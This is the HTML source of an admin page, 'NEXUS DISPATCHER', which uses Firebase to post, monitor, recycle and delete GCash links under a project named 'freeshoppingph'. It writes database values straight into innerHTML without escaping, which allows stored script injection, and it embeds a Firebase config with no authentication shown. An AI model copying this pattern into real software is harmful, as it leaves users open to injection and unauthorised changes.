<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS ADMIN</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { background: #0b0f13; color: white; font-family: sans-serif; padding: 20px; }
        .card { background: #161b22; padding: 20px; border-radius: 12px; margin-bottom: 20px; border: 1px solid #30363d; }
        .slot { background: #0d1117; padding: 15px; border-radius: 8px; margin-bottom: 10px; border-left: 5px solid #30363d; }
        .slot.in-use { border-left-color: #f85149; background: #1c1111; }
        .slot.avail { border-left-color: #2ea043; }
        button { cursor: pointer; padding: 8px 12px; border-radius: 5px; border: none; font-weight: bold; }
        .btn-rec { background: #d29922; color: black; }
        .btn-del { background: #f85149; color: white; margin-left: 5px; }
        textarea { width: 100%; padding: 10px; background: #0d1117; color: #58a6ff; border: 1px solid #30363d; border-radius: 5px; }
    </style>
</head>
<body>

    <div style="max-width: 600px; margin: 0 auto;">
        <h2>NEXUS DISPATCHER</h2>

        <div class="card">
            <textarea id="linkInput" placeholder="Paste GCash Link..."></textarea>
            <button onclick="addLink()" style="background:#238636; color:white; width:100%; margin-top:10px;">DEPLOY NEW LINK</button>
        </div>

        <h3>LIVE MONITORING</h3>
        <div id="linkList"></div> </div>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyDIPBhgIXb6oJiq2G6bVebelLrCBuPeCNE",
        authDomain: "freeshoppingph-3bade.firebaseapp.com",
        databaseURL: "https://freeshoppingph-3bade-default-rtdb.firebaseio.com",
        projectId: "freeshoppingph-3bade",
        storageBucket: "freeshoppingph-3bade.firebasestorage.app",
        messagingSenderId: "858532604838",
        appId: "1:858532604838:web:59a6a0f31d63c2cdda7d67"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    function addLink() {
        const url = document.getElementById('linkInput').value;
        if(!url) return;
        db.ref('links').push({ url: url, status: 'available', claimedBy: 'NONE' });
        document.getElementById('linkInput').value = '';
    }

    // ITO ANG KULANG: REALTIME LISTENER
    db.ref('links').on('value', snap => {
        const container = document.getElementById('linkList');
        container.innerHTML = ''; // Clear muna
        
        if(!snap.exists()) {
            container.innerHTML = '<p style="color:#555">No links deployed yet.</p>';
            return;
        }

        snap.forEach(child => {
            const data = child.val();
            const isUsed = data.status === 'in-use';
            
            const div = document.createElement('div');
            div.className = `slot ${isUsed ? 'in-use' : 'avail'}`;
            div.innerHTML = `
                <div style="font-size:12px; margin-bottom:10px;">
                    <strong>STATUS:</strong> ${isUsed ? '🔴 IN-USE' : '🟢 READY'}<br>
                    <strong>CLAIMED BY:</strong> ${data.claimedBy}<br>
                    <strong>URL:</strong> <span style="color:#58a6ff">${data.url.substring(0,40)}...</span>
                </div>
                <button class="btn-rec" onclick="recycle('${child.key}')">♻️ REUSE / RECYCLE</button>
                <button class="btn-del" onclick="remove('${child.key}')">DELETE</button>
            `;
            container.appendChild(div);
        });
    });

    function recycle(key) {
        db.ref('links/' + key).update({ status: 'available', claimedBy: 'NONE' });
    }

    function remove(key) {
        if(confirm("Delete permanently?")) db.ref('links/' + key).remove();
    }
</script>
</body>
</html>
